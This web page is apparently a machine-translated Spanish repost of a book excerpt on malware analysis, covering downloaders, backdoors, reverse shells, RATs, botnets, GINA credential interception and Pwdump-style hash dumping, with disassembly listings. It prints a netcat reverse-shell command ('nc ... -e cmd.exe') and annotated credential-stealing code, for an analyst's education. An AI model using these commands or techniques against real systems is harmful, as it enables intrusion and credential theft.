<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë©üèº‚Äçüåæ üëÉüèº üí• El libro "¬°Se mostrar√° una autopsia!" An√°lisis pr√°ctico de malware ¬ª üôåüèæ üë©üèæ‚Äçüöí üë≤üèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="El an√°lisis de malware se asemeja a un juego de gato y rat√≥n: sin reglas, la situaci√≥n cambia constantemente. Por lo tanto, en este caso, tiene sentid...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>El libro "¬°Se mostrar√° una autopsia!" An√°lisis pr√°ctico de malware ¬ª</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/piter/blog/416143/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/webt/jk/0g/rv/jk0grvjx0tqi91gqj9v6qmsqahs.jpeg" align="left" alt="imagen"></a>  El an√°lisis de malware se asemeja a un juego de gato y rat√≥n: sin reglas, la situaci√≥n cambia constantemente.  Por lo tanto, en este caso, tiene sentido estudiar solo cosas y algoritmos atemporales.  Tan pronto como se enfrente a la tarea de proteger la red (o mil redes), comenzar√° tal an√°lisis, y simplemente no puede prescindir de este libro. <br><br><h3>  Programas para descargar y ejecutar software </h3><br>  Hay dos tipos de malware que se encuentran con frecuencia dise√±ados para descargar y ejecutar software.  Los descargadores (que no deben confundirse con los descargadores del sistema) simplemente descargan c√≥digo malicioso adicional de Internet y lo ejecutan en una computadora local.  A menudo se distribuyen junto con el exploit.  Por lo general, usan dos llamadas a la API de Windows, una tras otra, para descargar y ejecutar malware adicional: URLDownloadtoFileA y WinExec. <br><a name="habracut"></a><br>  Launcher (lanzador) es un archivo ejecutable que instala aplicaciones maliciosas para su ejecuci√≥n oculta (inmediatamente o despu√©s de un tiempo).  Los lanzadores a menudo vienen con el software que necesitan para ejecutarse.  Los discutiremos en el cap√≠tulo 12. <br><br><h4>  Puertas traseras </h4><br>  Las puertas traseras son programas que proporcionan a un atacante acceso a la computadora de la v√≠ctima.  Son el tipo de malware m√°s detectable, y su tama√±o y conjunto de caracter√≠sticas pueden variar significativamente.  El c√≥digo de puerta trasera generalmente es aut√≥nomo y no requiere descargar archivos infectados adicionales. <br><br>  Las puertas traseras interact√∫an a trav√©s de Internet de muchas maneras diferentes, pero los datos generalmente se transmiten a trav√©s de HTTP a trav√©s del puerto 80. HTTP constituye la mayor parte del tr√°fico de red saliente, lo que le da al malware una gran oportunidad para pasar desapercibido en el contexto de otra informaci√≥n. <br><br>  En el Cap√≠tulo 14, aprender√° a analizar puertas traseras a nivel de paquete, creando firmas de red efectivas.  Mientras tanto, nos centraremos en la interacci√≥n de alto nivel. <br>  Las puertas traseras vienen con un conjunto est√°ndar de funciones: la capacidad de manipular las claves de registro, contar las ventanas que se muestran, crear directorios, buscar archivos, etc. Para comprender cu√°les de estas son utilizadas por la puerta trasera, puede verificar qu√© funciones API de Windows importa.  El Ap√©ndice A proporciona una lista de funciones comunes que describen lo que pueden decir sobre el malware. <br><br><h3>  Shell de comando inverso </h3><br>  Un shell de comando inverso es una conexi√≥n que inicia una computadora infectada, dando acceso de comando a un atacante.  Puede ser un programa malicioso separado o uno de los componentes de una puerta trasera m√°s compleja.  Mientras est√° en el shell de comando inverso, un atacante puede ejecutar comandos como si todo esto sucediera en su sistema local. <br><br><h4>  Netcat Reverse Command Shell </h4><br>  El programa Netcat que discutimos en el Cap√≠tulo 3 se puede usar para crear un shell de comandos si lo ejecuta en dos computadoras.  Los atacantes a menudo lo usan ellos mismos, as√≠ como lo complementan con otro malware. <br>  Para usar Netcat como tal, el sistema remoto debe esperar las conexiones entrantes con el siguiente comando: <br><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nc</span></span> -l ‚Äìp <span class="hljs-number"><span class="hljs-number">80</span></span></code> </pre> <br>  El conmutador -l cambia Netcat al modo de audici√≥n y el conmutador -p determina el puerto que se est√° supervisando.  Luego, la computadora de la v√≠ctima inicia una conexi√≥n saliente y proporciona su shell de comando: <br><br><pre> <code class="hljs dos">nc _ip <span class="hljs-number"><span class="hljs-number">80</span></span> -e <span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe</code> </pre> <br>  IP 80 listener es la direcci√≥n IP y el puerto del host remoto.  La opci√≥n -e le permite especificar el programa que se ejecutar√° cuando se establezca la conexi√≥n.  Su entrada y salida est√°ndar estar√°n vinculadas al socket (como ver√° m√°s adelante, Windows a menudo usa cmd.exe). <br><br><h4>  Shell inverso de Windows </h4><br>  Los atacantes usan dos implementaciones simples de shell de comando inverso basadas en cmd.exe en Windows: b√°sica y multiproceso. <br><br>  El m√©todo b√°sico es popular entre los autores de malware, ya que es m√°s f√°cil de implementar y generalmente no funciona peor que un enfoque de subprocesos m√∫ltiples.  Se basa en llamar a CreateProcess y cambiar la estructura STARTUPINFO que se le pasa.  Primero, se crea un socket y se establece una conexi√≥n con el servidor remoto.  Luego, este socket se conecta a los subprocesos est√°ndar (flujo de entrada, salida y error) del proceso cmd.exe.  CreateProcess ejecuta cmd.exe en modo sin ventanas para ocultarlo de la v√≠ctima.  El cap√≠tulo 7 da un ejemplo de esta t√©cnica. <br><br>  Una versi√≥n multiproceso del shell de comando inverso de Windows implica crear un socket, dos canales y dos hilos (por lo tanto, debe buscar las llamadas CreateThread y CreatePipe).  Los autores de malware a veces utilizan este m√©todo como parte de una estrategia para modificar o codificar datos transmitidos a trav√©s de un socket.  La funci√≥n CreatePipe se puede usar para enlazar los extremos de lectura y escritura del canal, como la entrada est√°ndar (stdin) y la salida est√°ndar (stdout).  La funci√≥n CreateProcess le permite enlazar hilos est√°ndar a un canal y no directamente a un socket.  Despu√©s de que se lo llame, el malware crear√° dos hilos de ejecuci√≥n: uno para leer desde el canal est√°ndar y escribir en el z√≥calo, y el otro para leer desde el z√≥calo y escribir en el canal est√°ndar.  T√≠picamente, estos hilos son datos de codificaci√≥n, que discutiremos en el Cap√≠tulo 13. Usando m√©todos de ingenier√≠a inversa, puede examinar las ramas en las que los flujos decodifican los paquetes recibidos durante una sesi√≥n cifrada. <br><br><h3>  Herramientas de administraci√≥n remota </h3><br>  Las herramientas de administraci√≥n remota (RAT) se utilizan para controlar una computadora o computadoras a trav√©s de una red.  A menudo est√°n involucrados en ataques estrechamente dirigidos, por ejemplo, cuando roban informaci√≥n o se mueven de una computadora a otra. <br><br>  En la fig.  11.1 muestra la estructura de red de la RAT.  El servidor que se ejecuta en el sistema de la v√≠ctima est√° equipado con un c√≥digo malicioso.  El cliente trabaja de forma remota porque el m√≥dulo de control est√° a disposici√≥n del atacante.  Los servidores le indican al cliente que los controla que inicie la conexi√≥n.  El interfuncionamiento en RAT generalmente ocurre a trav√©s de puertos est√°ndar, como 80 o 443. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/kj/7f/px/kj7fpxqhevkd2db817n4rjulxuu.png" alt="imagen"></div><br><h3>  Botnets </h3><br>  Una botnet es una colecci√≥n de nodos de red infectados (zombies) que se gestionan de forma centralizada, generalmente utilizando un servidor llamado controlador de botnet.  El objetivo de la botnet es infectar tantas computadoras como sea posible y crear una red a gran escala basada en ellas, que se pueda usar tanto para propagar otro malware o spam como para realizar ataques DDoS (denegaci√≥n de servicio distribuida). )  Si todos los zombies al mismo tiempo comienzan a atacar un sitio determinado, puede que sea inaccesible. <br><br><h3>  Comparaci√≥n de RAT y botnets </h3><br>  Existen varias diferencias importantes entre las botnets y las herramientas de administraci√≥n remota. <br><br><ul><li>  Se sabe que las botnets infectan y controlan millones de nodos.  Las RAT generalmente son ejecutadas por muchas menos computadoras. </li><li>  Todos los participantes de la botnet se gestionan simult√°neamente.  RAT le permite distribuir recursos entre diferentes v√≠ctimas, porque un atacante tiene la capacidad de interactuar m√°s estrechamente con los sistemas infectados. </li><li>  Las RAT se usan en ataques con objetivos espec√≠ficos, mientras que las botnets son notables por sus n√∫meros masivos. </li></ul><br><h3>  Robo de credenciales </h3><br>  Los atacantes a menudo recurren a todo tipo de trucos para robar credenciales.  Esto es especialmente cierto para los tres tipos de malware. <br><br><ul><li>  Programas que roban credenciales de usuario en el momento en que inicia sesi√≥n en el sistema. </li><li>  Programas que copian informaci√≥n almacenada en Windows (contrase√±as, hashes, etc.) para uso directo o descifrado posterior. </li><li>  Programas que graban pulsaciones de teclas. </li></ul><br>  En esta secci√≥n, analizamos cada uno de estos tipos de malware. <br><br><h3>  Intercepci√≥n GINA </h3><br>  Windows XP utiliza un truco para robar credenciales, que consiste en interceptar GINA (identificaci√≥n gr√°fica y autenticaci√≥n).  El sistema GINA se cre√≥ para permitir que las aplicaciones de terceros adapten el proceso de inicio de sesi√≥n por s√≠ mismos, agregando soporte para tecnolog√≠as como la identificaci√≥n por radiofrecuencia (RFID) basada en tokens o tarjetas inteligentes.  Los autores de malware aprovechan esta oportunidad para descargar c√≥digo que roba credenciales. <br><br>  GINA se implementa como un archivo DLL llamado msgina.dll y Winlogon lo carga durante el inicio de sesi√≥n.  Winlogon tambi√©n admite complementos de terceros, carg√°ndolos frente a la DLL de GINA (como en un ataque intermedio).  Para su comodidad, Windows proporciona la siguiente rama de registro, donde Winlogon puede encontrar y cargar archivos DLL de terceros: <br><br><pre> <code class="hljs tex">HKLM<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">SOFTWARE</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Microsoft</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Windows</span></span></span></span> NT<span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">CurrentVersion</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Winlogon</span></span></span></span><span class="hljs-tag"><span class="hljs-tag">\</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">GinaDLL</span></span></span></span></code> </pre> <br>  Una vez que encontramos un archivo fsgina.dll infectado all√≠, que result√≥ ser un interceptor GINA. <br>  En la fig.  La Figura 11.2 muestra un ejemplo de c√≥mo la informaci√≥n de inicio de sesi√≥n llega a una biblioteca maliciosa, pasando de Winlogon a msgina.dll.  El malware (fsgina.dll) logra interceptar todas las credenciales que el usuario ingresa durante la autenticaci√≥n.  Puede escribirlo en el disco o transferirlo a trav√©s de la red. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ge/eh/ma/geehmaneqdvfmxkmq9-8drvs5cc.png" alt="imagen"></div><br>  Dado que la biblioteca fsgina.dll intercepta el flujo de interacci√≥n entre Winlogon y GINA, debe pasarlo m√°s a msgina.dll para que el sistema contin√∫e funcionando normalmente.  Para hacer esto, el malware tiene que exportar todas las funciones que requiere el sistema GINA: hay m√°s de 15 y la mayor√≠a de ellas tienen el prefijo Wlx.  Obviamente, si encuentra en la DLL muchas funciones de exportaci√≥n que comienzan con Wlx, lo m√°s probable es que pueda suponer que se trata de un interceptor GINA. <br><br>  La mayor√≠a de estas llamadas de exportaci√≥n acceden a funciones reales dentro de msgina.dll.  En el caso de fsgina.dll, esto se aplica a todas las funciones excepto WlxLoggedOutSAS.  El listado 11.1 muestra la exportaci√≥n de WlxLoggedOutSAS a fsgina.dll. <br><br>  Listado 11.1.  Funci√≥n de exportaci√≥n WlxLoggedOutSAS en la DLL de GINA que registra las credenciales robadas <br><br><pre> <code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100014</span></span>A0 WlxLoggedOutSAS <span class="hljs-number"><span class="hljs-number">100014</span></span>A0 push esi <span class="hljs-number"><span class="hljs-number">100014</span></span>A1 push edi <span class="hljs-number"><span class="hljs-number">100014</span></span>A2 push offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  La informaci√≥n de credenciales se transfiere inmediatamente al archivo msgina.dll mediante una llamada designada como Call_msgina_dll_function (1).  Esta funci√≥n localiza e inicia din√°micamente la llamada WlxLoggedOutSAS desde msgina.dll, que se especifica como argumento.  Una llamada en l√≠nea (2) registra datos.  Como argumentos, toma informaci√≥n contable, una cadena de formato con la que se mostrar√° esta informaci√≥n y un nombre de archivo para la grabaci√≥n.  Como resultado, la informaci√≥n sobre cualquier inicio de sesi√≥n exitoso se guarda en el archivo% SystemRoot% \ system32 \ drivers \ tcpudp.sys.  Este archivo contiene el nombre de usuario, el dominio y dos contrase√±as: la actual y la anterior. <br><br><h3>  Guardar hashes </h3><br>  El software malicioso en Windows a menudo guarda los hashes del sistema para obtener acceso a las credenciales.  Despu√©s de guardar, los atacantes intentan descifrar estos hash fuera de l√≠nea o usarlos para atacar como pasar el hash.  Durante este ataque, los hashes LM y NTLM se utilizan para la autenticaci√≥n remota NTLM, que no requiere descifrado ni la obtenci√≥n de la contrase√±a correspondiente. <br><br>  Para guardar los hash, hay paquetes de software Pwdump y Pass-the-Hash (PSH) que son gratuitos.  Dado que ambas herramientas son de c√≥digo abierto, se ha creado una gran cantidad de malware sobre la base. <br><br>  La mayor√≠a de los antivirus tienen firmas para las versiones compiladas est√°ndar de estas utilidades, por lo que los atacantes a menudo intentan compilar sus propias variaciones para evitar su detecci√≥n.  Los ejemplos en este cap√≠tulo son los tipos de pwdump y PSH que hemos encontrado en la vida real. <br><br>  Pwdump es un conjunto de programas que generan hashes en formato LM i NTLM que pertenecen a usuarios locales desde el administrador de cuentas de seguridad (SAM).  Pwdump inyecta la DLL en el proceso LSASS (servicio de subsistema de autoridad de seguridad local), mejor conocido como lsass.exe.  Discutiremos la implementaci√≥n de las DLL en el cap√≠tulo 12, pero por ahora, solo necesita saber que esta es una t√©cnica a trav√©s de la cual el malware ejecuta bibliotecas dentro de otros procesos, utilizando todos sus privilegios.  Las herramientas para guardar hashes a menudo atacan el proceso lsass.exe porque tiene suficientes privilegios y acceso a muchas funciones API √∫tiles. <br><br>  La versi√≥n est√°ndar de Pwdump usa la biblioteca lsaext.dll.  Cuando se inyecta en lsass.exe, llama a la funci√≥n GetHash, que se exporta desde lsaext.dll para recuperar los hashes.  En este caso, se utilizan funciones de Windows no documentadas, que le permitir√°n obtener los n√∫meros de serie de todos los usuarios en el sistema y los hashes no cifrados de la contrase√±a para cada uno de ellos. <br><br>  Frente a la variaci√≥n de Pwdump, debe analizar sus bibliotecas para comprender c√≥mo se guardan los hashes.  Lo primero que debe prestar atenci√≥n a las funciones de exportaci√≥n.  La llamada GetHash se exporta desde Pwdump de forma predeterminada, pero los atacantes pueden cambiar f√°cilmente su nombre para que sea menos reconocible.  Entonces debe intentar determinar las funciones que se utilizan en las llamadas de exportaci√≥n.  Muchos de ellos pueden ubicarse din√°micamente; por lo tanto, las llamadas de exportaci√≥n a menudo reutilizan la operaci√≥n GetProcAddress. <br><br>  El listado 11.2 muestra el c√≥digo de la funci√≥n de exportaci√≥n GrabHash de la DLL de una versi√≥n de Pwdump.  Dado que la biblioteca est√° incrustada en lsass.exe, antes de usar muchos caracteres, primero debe encontrarlos en modo manual. <br><br>  Listado 11.2.  Llamadas API √∫nicas utilizadas por la funci√≥n de exportaci√≥n GrabHash en una de las variantes de Pwdump <br><br><pre> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  El listado 11.2 muestra el c√≥digo para recuperar los descriptores de la biblioteca samsrv.dll (1) y advapi32.dll (2) llamando a LoadLibrary.  El archivo samsrv.dll contiene una API para facilitar el acceso a SAM, y se encontr√≥ que el archivo advapi32.dll ten√≠a acceso a funciones que no se importaron a lsass.exe.  La biblioteca din√°mica de esta variaci√≥n Pwdump utiliza los descriptores de estas bibliotecas para buscar muchas funciones.  Los cinco m√°s importantes se muestran en la lista (tenga en cuenta las llamadas GetProcAddress y sus argumentos). <br><br>  Las llamadas interesantes como SamIConnect, SamrQueryInformationUser y SamIGetPrivateData se importan de samsrv.dll.  La llamada SamIConnect se utiliza posteriormente para conectarse a SAM, despu√©s de lo cual se llama a la funci√≥n SamrQueryInformationUser para cada usuario en el sistema. <br><br>  Los hashes se recuperan usando la llamada SamIGetPrivateData, y luego se descifran usando las funciones SystemFunction025 y SystemFunction027 importadas de advapi32.dll (l√≠neas (2) y (3)).  Ninguna de las funciones API en este listado se describe en la documentaci√≥n oficial. <br><br>  El Kit de herramientas de PSH contiene programas que crean volcados de hash.  El m√°s popular de estos vertederos se conoce como whosthere-alt.  Almacena el contenido SAM obtenido incrustando la DLL en lsass.exe.  Al mismo tiempo, en comparaci√≥n con Pwdump, se utiliza un conjunto completamente diferente de funciones API.  El listado 11.3 muestra el c√≥digo de versi√≥n de whosthere-alt, que exporta una funci√≥n llamada TestDump. <br><br>  Listado 11.3.  Llamadas API √∫nicas utilizadas por la funci√≥n de exportaci√≥n TestDump de la versi√≥n alternativa <br><br><pre> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  Como esta biblioteca est√° integrada en lsass.exe, su funci√≥n TestDump crea un volcado de hash.  Carga din√°micamente el archivo secur32.dll y encuentra la llamada LsaEnumerateLogonSessions (1) en √©l para obtener una lista de identificadores √∫nicos locales (LUID).  Esta lista contiene los nombres y dominios que se indicaron en cada inicio de sesi√≥n.  La biblioteca los revisa para acceder a la informaci√≥n contable.  Para hacer esto, utilizando una llamada a GetModuleHandle (2), busca dentro de msv1_0.dll una funci√≥n no exportada, NlpGetPrimaryCredential, que permite el volcado de hashes NT y LM. <br><br><h3>  Sobre los autores </h3><br>  <b>Michael Sikorski</b> es especialista en seguridad en Mandiant.  Est√° involucrado en el an√°lisis de malware como parte de una investigaci√≥n de incidentes y es consultor del gobierno de los EE. UU. Para la seguridad de la informaci√≥n.  Michael ha desarrollado una serie de cursos de an√°lisis de malware y los ense√±a a una audiencia diversa, incluidos el FBI y Black Hat.  Antes de Mandiant, era empleado del Laboratorio Lincoln en el Instituto de Tecnolog√≠a de Massachusetts y realiz√≥ investigaciones sobre topolog√≠a de red pasiva y pruebas de penetraci√≥n.  Adem√°s, Michael complet√≥ un programa de capacitaci√≥n interdisciplinaria de tres a√±os sobre sistemas y redes en la NSA.  Durante el entrenamiento, particip√≥ en el estudio de t√©cnicas de ingenier√≠a inversa y recibi√≥ varios premios en el campo del an√°lisis de redes. <br><br>  <b>Andrew Honig</b> es un experto en seguridad de la informaci√≥n en el Departamento de Defensa de los Estados Unidos.  Ense√±a an√°lisis de software, ingenier√≠a inversa y programaci√≥n para el sistema operativo (OS) de Windows en la Escuela Nacional de Criptograf√≠a, mientras es un especialista certificado en seguridad de sistemas de informaci√≥n.  Debido a Andrew, varios exploits de d√≠a cero para la virtualizaci√≥n de VMware, as√≠ como herramientas para detectar malware innovador, incluidos los m√≥dulos de kernel infectados.  Con diez a√±os de experiencia como analista en el campo de la seguridad inform√°tica, es considerado un experto en el an√°lisis e interpretaci√≥n de programas maliciosos y ordinarios. <br><br>  ¬ªSe puede encontrar m√°s informaci√≥n sobre el libro en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">el sitio web del editor</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Contenidos</a> <br>  ¬ª <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Extracto</a> <br><br>  Para Khabrozhiteley, un descuento del 20% en el cup√≥n: <b>una autopsia mostrar√°</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es416143/">https://habr.com/ru/post/es416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es416129/index.html">C√≥mo AI aprende a generar im√°genes de gatos</a></li>
<li><a href="../es416131/index.html">C√≥mo manejar la EP en la Federaci√≥n de Rusia y no violar la ley</a></li>
<li><a href="../es416135/index.html">Aplicaci√≥n GUI menor a 1 kb</a></li>
<li><a href="../es416137/index.html">Zabbix como esc√°ner de seguridad</a></li>
<li><a href="../es416139/index.html">Autenticaci√≥n fuerte como parte de la estrategia GDPR</a></li>
<li><a href="../es416147/index.html">Organizaci√≥n de la navegaci√≥n en aplicaciones iOS usando el Root Controller</a></li>
<li><a href="../es416149/index.html">Preguntas y respuestas sobre energ√≠as renovables, parte 1</a></li>
<li><a href="../es416151/index.html">Globo adimensional. An√°lisis utilitario de la dimensi√≥n m√°gica</a></li>
<li><a href="../es416153/index.html">¬øLos aviones se volver√°n m√°s confiables? Los fabricantes de aviones presentan robots a las empresas</a></li>
